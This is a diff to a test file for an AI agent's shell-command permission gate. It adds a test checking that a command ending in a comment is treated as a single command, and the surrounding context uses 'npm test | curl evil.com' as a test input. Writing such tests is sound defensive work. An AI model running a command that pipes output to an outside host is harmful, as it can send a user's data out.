@@ -2001,6 +2001,30 @@ describe("preApprove", () => {
     expect((await gate.evaluate(shellCall("npm test | curl evil.com"))).allowed).toBe(true);
     expect(asked).toBe(1);
   });
+
+  test("agrees with the interactive scope ladder on whether a comment-trailing command is single", async () => {
+    // "echo hi && # why" has one real segment once the trailing comment is
+    // filtered out. The interactive scope ladder (buildRequests/shellApprovalScopes)
+    // already filters comment-only segments before counting, so it offers the
+    // full per-command ladder (prefix + exact) as if this were one command.
+    // preApprove's gate must reach the same verdict, since both answer the
+    // same underlying "is this a single shell command" question.
+    const command = "echo hi && # why";
+
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => ({ allow: true }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    gate.preApprove("run_shell", command);
+    const preApproveTreatsAsSingle = gate.getSessionApprovals().length === 1;
+
+    const requests = buildRequests(shellCall(command));
+    const scopeLadderTreatsAsSingle = requests[0]!.scopes.length > 1;
+
+    expect(preApproveTreatsAsSingle).toBe(scopeLadderTreatsAsSingle);
+  });
 });
 
 describe("isAutoAllowedShellCall", () => {
